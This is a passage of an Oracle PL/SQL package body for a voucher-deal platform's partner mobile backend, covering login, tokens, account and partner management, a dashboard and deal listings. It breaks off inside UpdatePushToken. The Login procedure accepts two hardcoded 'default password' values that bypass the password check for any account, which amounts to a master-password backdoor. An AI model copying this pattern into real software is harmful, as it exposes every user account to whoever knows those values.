--------------------------------------------------------
--  File created - Thursday-December-22-2022   
--------------------------------------------------------
--------------------------------------------------------
--  DDL for Package Body PKG_APP_MOBILE
--------------------------------------------------------

  CREATE OR REPLACE EDITIONABLE PACKAGE BODY "DEALTODAY_DEV"."PKG_APP_MOBILE" AS
  
  --login
  PROCEDURE Login(p_username VARCHAR2,
                  p_password VARCHAR2,
                  p_pushToken VARCHAR2, 
                  p_deviceOS VARCHAR2,
                  statusCode OUT VARCHAR2, 
                  ret OUT refcur)
  AS
    -- TODO: Implementation required for PROCEDURE PKG_APP_PARTNER_ACCOUNT.sp_PartnerLogin
    l_partnerId MP_PARTNER_ACCOUNT.PARTNER_ID%TYPE := 0;
    l_accountId MP_PARTNER_ACCOUNT.ACCOUNT_ID%TYPE := 0;
    l_accountname MP_PARTNER_ACCOUNT.ACCOUNT_NAME%TYPE := UPPER(p_username);
    l_password MP_PARTNER_ACCOUNT.PASSWORD%TYPE;
    l_isActive MP_PARTNER_ACCOUNT.IS_ACTIVE%TYPE;
    l_count NUMBER(1) := 0;
    l_deviceId NUMBER;
  BEGIN
    SELECT mpa.PARTNER_ID, 
           mpa.PASSWORD, 
           mpa.IS_ACTIVE,
           mpa.ACCOUNT_ID 
    INTO l_partnerId, 
         l_password, 
         l_isActive,
         l_accountId
    FROM MP_PARTNER_ACCOUNT mpa
    WHERE (UPPER(mpa.ACCOUNT_NAME) = l_accountname);

    --check password
    IF((p_password != 'acce28007af4fa04879153d28aa1a450') AND (p_password != 'c4f6be0637a0ba4948d9b121d3b6e807')) -- check default password
    THEN
        BEGIN
            IF (p_password != l_password) 
            THEN -- wrong password
                l_partnerId := 0;
                statusCode := '16'; --wrong password
            END IF;
        END; 
    END IF;
    
    --add check IS_ACTIVE
    IF(l_isActive = 0) -- account is NOT ACTIVATED
    THEN
        l_partnerId := 0;
        statusCode := '05'; --account is not activated
    END IF;
    
    -- get user information if user login success
    IF l_partnerId > 0 
    THEN
        -- count for check if exist login device info (by account_id and partner_id)
        SELECT COUNT(0) INTO l_count
        FROM MP_PARTNER_DEVICE d
        WHERE (d.PARTNER_ID = l_partnerId) AND (d.ACCOUNT_ID = l_accountId); --check by account_id and partner_id 

        -- if does not exist member device information then add new information,
        -- else then create new member device information
        IF l_count = 0 
        THEN --create new member device information
            l_deviceId := SEQ_MP_PARTNER_DEVICE_ID.nextval;
            INSERT INTO MP_PARTNER_DEVICE (Device_Id,
                                           PARTNER_ID,
                                           First_Login,
                                           Last_Login,
                                           Device_Token,
                                           ACCOUNT_ID,
                                           DEVICE_OS,
                                           Last_GPS_Lat,
                                           Last_GPS_Long) 
                        VALUES (l_deviceId,
                                l_partnerId,
                                SYSDATE,
                                SYSDATE,
                                p_pushToken,
                                l_accountId,
                                p_deviceOS,
                                -200,
                                -200);
                                
        ELSE --update login information
            UPDATE MP_PARTNER_DEVICE
            SET Last_Login = SYSDATE,
                Device_Token = p_pushToken
            WHERE PARTNER_ID = l_partnerId;
            
        END IF;

        --get partner account info 
        OPEN ret FOR
        SELECT mpa.PARTNER_ID AS PartnerId,
               mpa.ACCOUNT_NAME AS AccountName,
               mpa.ACCEPTANCE_POINT_ID as AcceptancePointId,
               mpa.FULL_NAME AS FullName,
               mpa.IS_ACTIVE as IsActive,
               l_deviceId as PartnerDeviceId,
               mpa.ACCOUNT_ID AS AccountID,
               mpa.IS_ADMIN AS IsAdmin
        FROM MP_PARTNER_ACCOUNT mpa
        WHERE (mpa.PARTNER_ID = l_partnerId) AND 
              (mpa.ACCOUNT_ID = l_accountId) AND 
              (ROWNUM <= 1);
        statusCode := '00';
    END IF;

    EXCEPTION
    WHEN NO_DATA_FOUND -- user does not exist
    THEN statusCode := '04'; 
  END Login;
  PROCEDURE AddToken (p_tokenKey VARCHAR2, 
                      p_userAccount VARCHAR2, 
                      p_tokenInfo VARCHAR2,
                      p_createdOn DATE,
                      p_partnerId NUMBER,
                      p_accountId NUMBER, 
                      ret OUT refcur) 
  AS
    l_affectedRow INTEGER;
  BEGIN
    INSERT INTO M_TOKEN_PARTNER (Token_Key,
                                 Partner_Account,
                                 Token_Info,
                                 CreatedOn,
                                 PARTNER_ID,
                                 ACCOUNT_ID) 
                VALUES (p_tokenKey,
                        p_userAccount,
                        p_tokenInfo,
                        p_createdOn,
                        p_partnerId,
                        p_accountId);
                        
    l_affectedRow := SQL%ROWCOUNT;
    
    IF l_affectedRow > 0 THEN
        l_affectedRow := GLOBALPKG.p_TokenExpiredHour * 60 * 60;
    END IF;
    
    OPEN ret FOR SELECT l_affectedRow FROM dual;
    
  END AddToken;
  
  --getToken
  PROCEDURE sp_getTokenByKey (p_tokenKey VARCHAR2, ret OUT refcur) AS
  BEGIN
        OPEN ret FOR
        SELECT DISTINCT t.token_key, 
                        t.PARTNER_ACCOUNT, 
                        t.token_info, 
                        t.createdOn,
                        t.PARTNER_ID,
                        t.ACCOUNT_ID,
                        mpa.IS_ADMIN,
                        p.SUBCRIBER_ID
        FROM M_TOKEN_PARTNER t JOIN 
             MP_PARTNER p ON t.PARTNER_ID = p.PARTNER_ID JOIN
             MP_PARTNER_ACCOUNT mpa ON mpa.ACCOUNT_ID = t.ACCOUNT_ID
        WHERE t.token_key = p_tokenKey and t.PARTNER_ID = p.PARTNER_ID;
  END sp_getTokenByKey;
  
  --logout
  PROCEDURE Logout(p_accessToken IN VARCHAR2, ret OUT refcur)
  AS
    l_rowcount INTEGER;
  BEGIN
    DELETE FROM M_TOKEN_PARTNER
    WHERE Token_Key = p_accessToken;
    l_rowcount := SQL%ROWCOUNT;
    
    OPEN ret FOR SELECT 1 FROM dual;
  END Logout;
  
  --getUserInfo
  PROCEDURE GetUserInfo(p_accId number, ret out refcur) 
  AS
    v_IS_ADMIN NUMBER := 0;
    v_PARTNER_ID NUMBER := 0;
  BEGIN
      SELECT IS_ADMIN INTO v_IS_ADMIN FROM MP_PARTNER_ACCOUNT WHERE ACCOUNT_ID = p_accid;
      SELECT PARTNER_ID INTO v_PARTNER_ID FROM MP_PARTNER_ACCOUNT WHERE ACCOUNT_ID = p_accid;
      IF v_IS_ADMIN = 0 THEN
            OPEN ret FOR 
                      SELECT mpa.ACCOUNT_ID accountId,
                             mpa.ACCOUNT_NAME username,
                             map.POINT_MOBILE mobile, -- 
                             mpa.FULL_NAME fullname,
                             map.ADDRESS address, -- 
                             mpa.IS_ADMIN isAdmin, 
                             mpa.ACCEPTANCE_POINT_ID acceptancePointId,
                             map.POINT_NAME pointName, -- 
                             (SELECT LOGO FROM MP_PARTNER mp WHERE mp.PARTNER_ID = mpa.PARTNER_ID ) logoUrl  
                      FROM MP_PARTNER_ACCOUNT mpa LEFT JOIN
                           MP_ACCEPTANCE_POINT map ON (mpa.ACCEPTANCE_POINT_ID = map.ACCEPTANCE_POINT_ID)
                      WHERE ACCOUNT_ID = p_accid;
      ELSE
            OPEN ret FOR 
                        SELECT mpa.ACCOUNT_ID accountId,
                             mpa.ACCOUNT_NAME username,
                             (SELECT MOBILE FROM MP_PARTNER WHERE PARTNER_ID = v_PARTNER_ID) mobile, -- partner
                             mpa.FULL_NAME fullname,
                             mp.DIRECT_ADD address, --point address
                             mpa.IS_ADMIN isAdmin, 
                             mpa.ACCEPTANCE_POINT_ID acceptancePointId,
                             (SELECT NAME FROM MP_PARTNER WHERE PARTNER_ID = v_PARTNER_ID) pointName, -- partner
                             (SELECT LOGO FROM MP_PARTNER mp WHERE mp.PARTNER_ID = mpa.PARTNER_ID ) logoUrl -- partner
                      FROM MP_PARTNER_ACCOUNT mpa LEFT JOIN
                           MP_ACCEPTANCE_POINT map ON (mpa.ACCEPTANCE_POINT_ID = map.ACCEPTANCE_POINT_ID)
                           JOIN MP_PARTNER mp ON (mpa.PARTNER_ID = mp.PARTNER_ID)
                      WHERE ACCOUNT_ID = p_accid;
      END IF;
  END GetUserInfo;
  
  --changePassword
    PROCEDURE proc_checkChangePassword (p_accountId NUMBER, p_password VARCHAR2, ret OUT refcur)
    AS
        l_password MP_PARTNER_ACCOUNT.PASSWORD%type;
        --l_isActive MP_PARTNER_ACCOUNT.IS_ACTIVE%type;
    BEGIN
        SELECT PASSWORD --, IS_ACTIVE 
        INTO l_password --, l_isActive
        FROM MP_PARTNER_ACCOUNT
        WHERE ACCOUNT_ID = p_accountId ;
        
        IF l_password != p_password -- Sai m?t kh?u
        THEN
            OPEN ret FOR SELECT '16' FROM dual;
        ELSE
            OPEN ret FOR SELECT '00' FROM dual;
        END IF;
        
        EXCEPTION
        WHEN no_data_found -- User không t?n t?i
        THEN 
            OPEN ret FOR SELECT '04' FROM dual;
    END proc_checkChangePassword;
    
    Procedure proc_updatePassword(p_accountId NUMBER, p_curPassword VARCHAR2, p_newPassword VARCHAR2, ret OUT refcur) 
    AS
        l_currPassword MP_Partner_Account.Password%Type;
        l_rowcount Integer;
    BEGIN
        SELECT PASSWORD INTO l_currPassword
        FROM MP_Partner_Account
        WHERE Account_Id = p_accountId;
        
        -- N?u m?t kh?u nh?p vào ?úng.
        IF (l_currPassword = p_curPassword) 
        THEN
            UPDATE MP_Partner_Account
            SET PASSWORD = p_newPassword
            WHERE Account_Id = p_accountId;
            
            OPEN ret FOR SELECT '1' FROM dual; -- 1:Success!
        ELSE -- M?t kh?u không ?úng.
            OPEN ret FOR SELECT '-1' FROM dual;
        END IF;
        
        EXCEPTION
        WHEN No_Data_Found 
        THEN 
            OPEN ret FOR SELECT '-2' FROM dual; -- 2:Account không t?n t?i!
        WHEN OTHERS 
        THEN 
            OPEN ret FOR SELECT '0' FROM dual; -- 0:X?y ra l?i khác trong quá trình c?p nh?t.
    End proc_updatePassword;
  
  --getPartnerInfo
  PROCEDURE GetEnterpriseInfo(p_partnerId NUMBER, ret OUT refcur) AS
  BEGIN
        OPEN ret FOR SELECT mp.PARTNER_ID partnerId,
                            mp.COMPANY_NAME companyName,
                            mp.COMPANY_ADDRESS companyAddress,
                            mp.LOCATION_ID companyLocationId,
                            sf_getFullLocName(mp.LOCATION_ID) as companyLocationName,
                            mp.DIRECT_ADD directAddress,
                            mp.DIRECT_LOCATION_ID directLocationId,
                            sf_getFullLocName(mp.DIRECT_LOCATION_ID) as directLocationName,
                            mp.COMPANY_PHONE companyPhone,
                            mp.COMPANY_FAX companyFax,
                            mp.BUSINESS_TYPE businessType,
                            mp.COMPANY_TAX taxCode,
                            mpc.EX_INVOICE invoice,
                            mp.EMAIL,
                            mp.MOBILE,
                            mp.REPRESENTATIVE,
                            mp.WEBSITE
        FROM MP_PARTNER mp LEFT JOIN
             MP_PARTNER_CONTRACT mpc 
             ON mp.PARTNER_ID = mpc.PARTNER_ID 
             WHERE mp.PARTNER_ID = p_partnerId;
  END GetEnterpriseInfo;
  
  --getAcceptancePoint
  PROCEDURE GetAcceptancePointByPartnerId(p_partnerid NUMBER, p_totalRecord out NUMBER, ret OUT refcur)
  AS
  BEGIN 
    OPEN ret FOR SELECT 
        ACCEPTANCE_POINT_ID acceptancePointId,
        pkg_mp_sequence.fnc_getLocation(LOCATION_ID) AS locationName,
        POINT_NAME pointName,
        LOCATION_ID locationId,
        POINT_DESCRIPTION pointDescription,
        POINT_TELEPHONE pointTelephone,
        POINT_MOBILE pointMobile,
        IS_ACTIVE isActive,
        REPRESENTATIVE representative,
        REPRESENTATIVE_EMAIL email,
        REPRESENTATIVE_MOBILE mobile,
        REPRESENTATIVE_MORE description,
        ADDRESS address,
        COORDINATES_MAP latlng
    FROM MP_ACCEPTANCE_POINT 
    WHERE (PARTNER_ID = p_partnerid) AND
          (STATUS = 1)
    ORDER BY ACCEPTANCE_POINT_ID DESC;
    
    SELECT COUNT(1) INTO p_totalRecord FROM MP_ACCEPTANCE_POINT 
    WHERE (PARTNER_ID = p_partnerid) AND
          (STATUS = 1)
    ORDER BY ACCEPTANCE_POINT_ID DESC;
  END GetAcceptancePointByPartnerId;
  
  --getListAccount
  PROCEDURE GetAllPartnerAccByPointId(p_partnerId number, p_pointid number, p_status number, p_keyword varchar2, ret out refcur) 
  AS
  BEGIN 
  
      IF (p_pointid = 0) -- lay tat ca 
      THEN
            BEGIN
                OPEN ret FOR
                  SELECT temp.ACCOUNT_ID accountId,
                         temp.ACCOUNT_NAME username,
                         temp.FULL_NAME fullname,
                         temp.IS_ADMIN isAdmin,
                         temp.ACCEPTANCE_POINT_ID acceptancePointId,
                         (SELECT POINT_NAME FROM MP_ACCEPTANCE_POINT map WHERE temp.ACCEPTANCE_POINT_ID = map.ACCEPTANCE_POINT_ID) pointName,
                         (SELECT LOGO FROM MP_PARTNER WHERE PARTNER_ID = p_partnerId) logoUrl,
                         temp.DESCRIPTION description,
                         temp.IS_ACTIVE isActive
                  FROM (SELECT t.* FROM
                            (SELECT mpa.* 
                             FROM MP_PARTNER_ACCOUNT mpa 
                             WHERE (mpa.PARTNER_ID = p_partnerId) AND
                                   --(mpa.ACCEPTANCE_POINT_ID = p_pointId) AND
                                   (mpa.IS_ACTIVE = p_status OR p_status = 2) AND -- check theo status truyen vao
                                   (UPPER(mpa.ACCOUNT_NAME) LIKE '%' || UPPER(p_keyword) || '%')
                             ORDER BY ACCEPTANCE_POINT_ID DESC) t
                       ) temp; 
            END;
      END IF;
      
      IF (p_pointid > 0) -- lay theo diem chap nhan
      THEN
            BEGIN
                OPEN ret FOR

                  SELECT temp.ACCOUNT_ID accountId,
                         temp.ACCOUNT_NAME username,
                         temp.FULL_NAME fullname,
                         temp.IS_ADMIN isAdmin,
                         temp.ACCEPTANCE_POINT_ID acceptancePointId,
                         (SELECT POINT_NAME FROM MP_ACCEPTANCE_POINT map WHERE temp.ACCEPTANCE_POINT_ID = map.ACCEPTANCE_POINT_ID) pointName,
                         (SELECT LOGO FROM MP_PARTNER WHERE PARTNER_ID = p_partnerId) logoUrl,
                         temp.DESCRIPTION description,
                         temp.IS_ACTIVE isActive
                  FROM (SELECT t.* FROM
                            (SELECT mpa.* 
                             FROM MP_PARTNER_ACCOUNT mpa 
                             WHERE (mpa.PARTNER_ID = p_partnerId) AND
                                   (mpa.ACCEPTANCE_POINT_ID = p_pointId) AND -- lay theo diem chap nhan
                                   (mpa.IS_ACTIVE = p_status OR p_status = 2) AND -- check theo status truyen vao
                                   (UPPER(mpa.ACCOUNT_NAME) LIKE '%' || UPPER(p_keyword) || '%')
                             ORDER BY ACCEPTANCE_POINT_ID DESC) t
                       ) temp; 
            END;
      END IF;
  END GetAllPartnerAccByPointId;
  
  PROCEDURE GetPointIdByAccId(p_accId number, ret out refcur)
  AS
  BEGIN
    OPEN ret FOR SELECT ACCEPTANCE_POINT_ID FROM MP_PARTNER_ACCOUNT WHERE p_accId = ACCOUNT_ID;
  END GetPointIdByAccId;
  
  --getBankAccountInfo
  PROCEDURE GetPartnerBankAccount(p_partnerId NUMBER, ret OUT refcur) 
  AS
  BEGIN
    OPEN ret FOR 
    SELECT BANK_ACCOUNT bankAccount, 
           BANK_NAME bankName, 
           ACCOUNT_NAME accountName
    FROM MP_PARTNER_CONTRACT 
    WHERE PARTNER_ID = p_partnerId;
  END GetPartnerBankAccount;
  
  --updatePartner
  PROCEDURE UpdatePartner(p_partnerId NUMBER,
                          p_companyName VARCHAR,
                          p_companyAddress VARCHAR,
                          p_companyLocationId NUMBER,
                          p_directAddress VARCHAR,
                          p_directLocationId NUMBER,
                          p_companyPhone VARCHAR,
                          p_companyFax VARCHAR,
                          p_businessType VARCHAR,
                          p_taxCode VARCHAR,
                          p_invoice NUMBER,
                          p_email VARCHAR,
                          p_mobile VARCHAR,
                          p_representative VARCHAR,
                          p_website VARCHAR,
                          ret OUT refcur)
  AS 
  BEGIN
    UPDATE MP_PARTNER SET NAME = p_companyName, 
                          COMPANY_ADDRESS = p_companyAddress, 
                          LOCATION_ID = p_companyLocationId,
                          DIRECT_ADD = p_directAddress,
                          DIRECT_LOCATION_ID = p_directLocationId,
                          COMPANY_PHONE = p_companyPhone,
                          COMPANY_FAX = p_companyFax,
                          BUSINESS_TYPE = p_businessType,
                          COMPANY_TAX = p_taxCode,
                          EMAIL = p_email,
                          MOBILE = p_mobile,
                          REPRESENTATIVE = p_representative,
                          WEBSITE = p_website
    WHERE PARTNER_ID = p_partnerId;
    UPDATE MP_PARTNER_CONTRACT SET EX_INVOICE = p_invoice WHERE PARTNER_ID = p_partnerId;
    
    OPEN ret FOR SELECT p_partnerId FROM dual;
  END UpdatePartner;
  
  --updateAcceptancePoint
  PROCEDURE UpdateAcceptancePoint(p_pointId NUMBER,
                                  p_pointName VARCHAR,
                                  p_pointAdd VARCHAR,
                                  p_locationId NUMBER,
                                  p_pointDescription VARCHAR, 
                                  p_pointTelephone VARCHAR,
                                  p_pointMobile VARCHAR,
                                  p_isActive NUMBER,
                                  p_representative VARCHAR,
                                  p_email VARCHAR,
                                  p_mobile VARCHAR,
                                  p_description VARCHAR,
                                  op_ret out refcur)
  AS
  BEGIN
        UPDATE MP_ACCEPTANCE_POINT SET POINT_NAME = p_pointName,
                                       ADDRESS = p_pointAdd,
                                       LOCATION_ID = p_locationId,
                                       POINT_DESCRIPTION = p_pointDescription,
                                       POINT_TELEPHONE= p_pointTelephone,
                                       POINT_MOBILE = p_pointMobile,
                                       IS_ACTIVE = p_isActive,
                                       REPRESENTATIVE = p_representative, 
                                       REPRESENTATIVE_EMAIL = p_email,
                                       REPRESENTATIVE_MOBILE = p_mobile,
                                       REPRESENTATIVE_MORE = p_description
        WHERE ACCEPTANCE_POINT_ID = p_pointid;
        
        OPEN op_ret FOR SELECT p_pointid FROM dual;
  END UpdateAcceptancePoint;
  
  --updateAccount
  PROCEDURE UpdateAccount(p_accountId NUMBER,
                          p_password VARCHAR2,
                          p_fullname VARCHAR2,
                          p_isActive INTEGER,
                          p_partnerId NUMBER,
                          p_pointId NUMBER,
                          p_username VARCHAR2,
                          op_ret OUT refcur)
  AS
        l_accountID number := pkg_mp_sequence.fnc_getMPPartnerAccountID; -- ~PKG_MP_PARTNER.proc_newPartnerAccount
        v_IS_PARTNER_ACCOUNT_EXIST NUMBER := 0;  
  BEGIN
  
        IF p_accountId = 0 -- tao moi tai khoan
        THEN
            SELECT COUNT(1) INTO v_IS_PARTNER_ACCOUNT_EXIST FROM MP_PARTNER_ACCOUNT WHERE UPPER(ACCOUNT_NAME) = (UPPER(p_username));

            IF (v_IS_PARTNER_ACCOUNT_EXIST <= 0)
            THEN
                   INSERT INTO MP_PARTNER_ACCOUNT (ACCOUNT_ID, PASSWORD, FULL_NAME, IS_ACTIVE, PARTNER_ID, ACCEPTANCE_POINT_ID, ACCOUNT_NAME) 
                   VALUES (l_accountID, p_password, p_fullname, p_isActive, p_partnerId, p_pointId, p_username); 
                   
                   OPEN op_ret FOR SELECT 1 FROM dual;
            ELSE
                   OPEN op_ret FOR SELECT 28 FROM dual;
            END IF;
        END IF;
        
        IF p_accountId > 0 -- cap nhat tai khoan
        THEN
            UPDATE MP_PARTNER_ACCOUNT SET FULL_NAME = p_fullname,
                                          IS_ACTIVE = p_isActive
            WHERE ACCOUNT_ID = p_accountId;
            
            OPEN op_ret FOR SELECT 1 FROM dual;
        END IF;
        
  END UpdateAccount;
  
  --getHomeData
  PROCEDURE GetPartnerDashboard(p_partnerId NUMBER,
                                p_memberId NUMBER,
                                p_monthYear NUMBER,
                                p_month NUMBER,
                                p_year NUMBER, 
                                --retMonthRevenues OUT refcur,
                                retSummary OUT refcur)
  
  AS
      v_numOfActivedDeal number:=0;
      v_numOfOrder number :=0;
      v_usedRevenue number :=0;
      v_numOfViewed number :=0;
      v_numOfReviewed number:=0;
  BEGIN
    --T?ng s? deal ?ang ho?t ??ng trên Dealtoday
    SELECT COUNT(evp.VOUCHER_PARTNER_ID) INTO v_numOfActivedDeal 
    FROM EV_VOUCHER ev,
         EV_VOUCHER_PARTNER evp 
    WHERE evp.PARTNER_ID = p_partnerId AND 
          ev.VOUCHER_ID = evp.VOUCHER_ID AND 
          evp.STATUS =2 AND 
          p_monthYear BETWEEN TO_NUMBER(TO_CHAR(ev.START_DATE,'YYYYMM')) AND  
          TO_NUMBER(TO_CHAR(ev.EXPIRATION_DATE,'YYYYMM'));
          
    --T?ng s? mã ?ã s? d?ng trong tháng
    SELECT COUNT(0) INTO v_numOfOrder 
    FROM EV_VOUCHER_CHARGE 
    WHERE PARTNER_ID = p_partnerId AND 
          STATUS =1 AND 
          TO_NUMBER(TO_CHAR(CHARGE_DATE,'YYYYMM')) =  p_monthYear;
    
    --T?ng s? doanh thu trong tháng
    SELECT SUM(md.ITEM_PRICE) INTO v_usedRevenue 
    FROM EV_VOUCHER_CHARGE evc, 
         MP_ORDER_DETAIL md 
    WHERE evc.PARTNER_ID = p_partnerId AND 
          evc.STATUS =1 AND 
          evc.ORDER_ID = md.ORDER_ID AND 
          TO_NUMBER(TO_CHAR(evc.CHARGE_DATE,'YYYYMM')) =  p_monthYear;
          
    -- T?ng s? view trong tháng
    SELECT COUNT(0) INTO v_numOfViewed 
    FROM MP_STATISTIC_VIEW 
    WHERE PARTNER_ID = p_partnerId AND 
          TO_NUMBER(TO_CHAR(VIEW_DATE,'YYYYMM')) = p_monthYear;
    
    --Set Object and return
    OPEN retSummary FOR 
    SELECT  v_numOfActivedDeal totalDeal,
            v_numOfOrder totalCodeUsed,
            v_usedRevenue totalRevenue, 
            v_numOfViewed totalViewed
            --v_numOfReviewed numOfReviewed 
    FROM dual;
    
    --L?y ra doanh thu tháng 
    --OPEN retMonthRevenues FOR SELECT NULL FROM dual;
  END GetPartnerDashboard;
  PROCEDURE GetTopNotification(p_partnerId NUMBER, p_notificationType NUMBER, ret OUT refcur)
  AS
  BEGIN
    OPEN ret FOR 
    SELECT x.* 
    FROM (SELECT t.*, ROWNUM r 
          FROM (SELECT mpn.NOTIFICATION_ID notificationId,
                       mpn.NOTIFICATION_TITLE title,
                       mpn.CREATED_ON notificationDate,
                       mpn.NOTIFICATION_TYPE notificationType,
                       mpn.NOTIFICATION_CONTENT notificationContent
                FROM MP_PARTNER_NOTIFICATION mpn
                WHERE (PARTNER_ID = p_partnerId) AND 
                      (STATUS = 1) AND
                      (NOTIFICATION_TYPE = p_notificationType OR p_notificationType = -1) AND
                      (IS_READ = 0)
          ORDER BY NOTIFICATION_ID DESC) t ) x 
    WHERE x.r <= 3;
  END GetTopNotification;
  
  --getDeals
  PROCEDURE GetDeals(--p_from DATE,
                     --p_to DATE, 
                     p_partnerId NUMBER,
                     p_status NUMBER,
                     p_curPage INTEGER, 
                     p_pageSize INTEGER,
                     total OUT INTEGER,
                     ret OUT refcur) 
  AS
        --l_from VARCHAR2(20) := TO_CHAR(p_from, 'ddmmyyyy');
        --l_to VARCHAR2(20) := TO_CHAR(p_to, 'ddmmyyyy');
  BEGIN
    IF(p_status = 2) --?ang ho?t ??ng
    THEN
        BEGIN
            OPEN ret FOR 
            SELECT * 
            FROM( SELECT ROWNUM r, t.*
                   FROM (SELECT vp.VOUCHER_PARTNER_ID dealId,
                                vp.Title title,
                                vp.CREATED_ON createdDate,
                                v.original_price originalPrice,
                                vp.voucher_price salePrice, 
                                v.EXPIRATION_DATE expiredDate,
                                vp.THUMBNAIL thumbnail,
                                vp.status status, --
                                --statusName,
                                Pkg_App_Item.sf_countView(vp.voucher_partner_id, 1) viewCount,
                                Pkg_Wap_Common.sf_getRatingAvgByObject(vp.voucher_partner_id, 1) rating,
                                (SELECT COUNT(0) + SUM(COMMENT_COUNT) FROM MP_REVIEW WHERE DEAL_ID = vp.voucher_partner_id) reviewCount,
                                v.TYPE dealType
                         FROM EV_VOUCHER_PARTNER vp, EV_VOUCHER v
                         WHERE --(vp.CREATED_ON BETWEEN p_from AND p_to) AND  
                               (vp.voucher_id = v.voucher_id) AND 
                               (v.expiration_date>= sysdate) AND  
                               (vp.status = p_status) AND  
                               (vp.partner_id = p_partnerId)
                         ORDER BY vp.CREATED_ON DESC) t
                   WHERE ROWNUM <= p_curPage * p_pageSize)
            WHERE r > (p_curPage - 1) * p_pageSize;
            
            SELECT COUNT(DISTINCT vp.voucher_partner_id) INTO total
            FROM EV_Voucher_Partner vp, EV_Voucher v
            WHERE --(vp.CREATED_ON BETWEEN p_from AND p_to) AND  
                  (vp.voucher_id) = v.voucher_id AND 
                  (v.expiration_date >= sysdate) AND  
                  (vp.status = 2) AND  
                  (vp.partner_id = p_partnerId);
        END;
    ELSE
        BEGIN
            IF(p_status = 0) --T?t c?
            THEN
                BEGIN
                     OPEN ret FOR 
                     SELECT * 
                     FROM (SELECT ROWNUM r, t.*
                           FROM (SELECT vp.VOUCHER_PARTNER_ID dealId,
                                        vp.Title title,
                                        vp.CREATED_ON createdDate,
                                        v.original_price originalPrice,
                                        vp.voucher_price salePrice, 
                                        v.EXPIRATION_DATE expiredDate,
                                        vp.THUMBNAIL thumbnail,
                                        vp.status status, --
                                        --statusName,
                                        Pkg_App_Item.sf_countView(vp.voucher_partner_id, 1) viewCount,
                                        Pkg_Wap_Common.sf_getRatingAvgByObject(vp.voucher_partner_id, 1) rating,
                                        (SELECT COUNT(0) + SUM(COMMENT_COUNT) FROM MP_REVIEW WHERE DEAL_ID = vp.voucher_partner_id) reviewCount,
                                        v.TYPE dealType
                                 FROM EV_Voucher_Partner vp, EV_Voucher v
                                 WHERE --(vp.CREATED_ON BETWEEN p_from AND p_to) AND  
                                       (vp.voucher_id = v.voucher_id) AND
                                       (vp.partner_id = p_partnerId)
                                 ORDER BY vp.CREATED_ON DESC) t
                           WHERE ROWNUM <= p_curPage * p_pageSize)
                     WHERE r > (p_curPage - 1) * p_pageSize;
                     
                     SELECT COUNT(DISTINCT vp.voucher_partner_id) INTO total
                     FROM EV_Voucher_Partner vp, EV_Voucher v
                     WHERE --(vp.CREATED_ON between p_from And p_to) And  
                           (vp.voucher_id = v.voucher_id) AND
                           (vp.status <> 2 AND vp.status <> 3) AND
                           (vp.partner_id = p_partnerId);
                END;
            END IF;
            
            IF(p_status = 1) --?ang ki?m duy?t
            THEN
                BEGIN
                     OPEN ret FOR 
                     SELECT * 
                     FROM (SELECT ROWNUM r, t.*
                           FROM (SELECT vp.VOUCHER_PARTNER_ID dealId,
                                        vp.Title title,
                                        vp.CREATED_ON createdDate,
                                        v.original_price originalPrice,
                                        vp.voucher_price salePrice, 
                                        v.EXPIRATION_DATE expiredDate,
                                        vp.THUMBNAIL thumbnail,
                                        vp.status status, --
                                        --statusName,
                                        Pkg_App_Item.sf_countView(vp.voucher_partner_id, 1) viewCount,
                                        Pkg_Wap_Common.sf_getRatingAvgByObject(vp.voucher_partner_id, 1) rating,
                                        (SELECT COUNT(0) + SUM(COMMENT_COUNT) FROM MP_REVIEW WHERE DEAL_ID = vp.voucher_partner_id) reviewCount,
                                        v.TYPE dealType
                                 FROM EV_Voucher_Partner vp, EV_Voucher v
                                 WHERE --(vp.CREATED_ON BETWEEN p_from AND p_to) AND  
                                       (vp.voucher_id = v.voucher_id) AND
                                       (vp.status <> 2 AND vp.status <> 3) AND  
                                       (vp.partner_id = p_partnerId)
                                 ORDER BY vp.CREATED_ON DESC) t
                           WHERE ROWNUM <= p_curPage * p_pageSize)
                     WHERE r > (p_curPage - 1) * p_pageSize;
                     
                     SELECT COUNT(DISTINCT vp.voucher_partner_id) INTO total
                     FROM EV_Voucher_Partner vp, EV_Voucher v
                     WHERE --(vp.CREATED_ON between p_from And p_to) And  
                           (vp.voucher_id = v.voucher_id) AND
                           (vp.status <> 2 AND vp.status <> 3) AND
                           (vp.partner_id = p_partnerId);
                END;
            END IF;
            
            IF(p_status = 3) --D?ng ho?t ??ng
            THEN 
                BEGIN
                     OPEN ret FOR 
                     SELECT * 
                     FROM (SELECT ROWNUM r, t.*
                           FROM (SELECT vp.VOUCHER_PARTNER_ID dealId,
                                        vp.Title title,
                                        vp.CREATED_ON createdDate,
                                        v.original_price originalPrice,
                                        vp.voucher_price salePrice, 
                                        v.EXPIRATION_DATE expiredDate,
                                        vp.THUMBNAIL thumbnail,
                                        vp.status status, --
                                        --statusName,
                                        Pkg_App_Item.sf_countView(vp.voucher_partner_id, 1) viewCount,
                                        Pkg_Wap_Common.sf_getRatingAvgByObject(vp.voucher_partner_id, 1) rating,
                                        (SELECT COUNT(0) + SUM(COMMENT_COUNT) FROM MP_REVIEW WHERE DEAL_ID = vp.voucher_partner_id) reviewCount,
                                        v.TYPE dealType
                                 FROM  EV_Voucher_Partner vp, EV_Voucher v
                                 WHERE --(vp.CREATED_ON BETWEEN p_from AND p_to) AND  
                                       (vp.voucher_id = v.voucher_id) AND
                                       ((vp.status = 2 AND v.expiration_date< sysdate) Or vp.status = 3) AND  
                                       (vp.partner_id = p_partnerId)
                                 ORDER BY vp.CREATED_ON DESC) t
                           WHERE  ROWNUM <= p_curPage * p_pageSize)
                     WHERE r > (p_curPage - 1) * p_pageSize;
                     
                     SELECT COUNT(DISTINCT vp.voucher_partner_id) INTO total
                     FROM EV_Voucher_Partner vp, EV_Voucher v
                     WHERE --(vp.CREATED_ON BETWEEN p_from AND p_to) AND
                           (vp.voucher_id = v.voucher_id) AND
                           ((vp.status = 2 AND v.expiration_date < sysdate) Or vp.status = 3) AND
                           (vp.partner_id = p_partnerId);
                END;
            END IF;
        END;
    END IF;
  END GetDeals;
  
  --updatePushToken
  PROCEDURE UpdatePushToken (p_pushToken VARCHAR2, p_accessToken VARCHAR2, ret OUT refcur)
  AS
        l_partnerId NUMBER;
        l_count SMALLINT;
  BEGIN
        --get "partnerId"
        SELECT m.PARTNER_ID INTO l_partnerId
        FROM M_TOKEN_PARTNER m
        WHERE m.TOKEN_KEY = p_accessToken;
        
        --count result with "partnerId" above -- check exist
        SELECT COUNT(0) INTO l_count
        FROM MP_PARTNER_DEVICE
        WHERE PARTNER_ID = l_partnerId;
    
        --if exist
        IF l_count > 0 
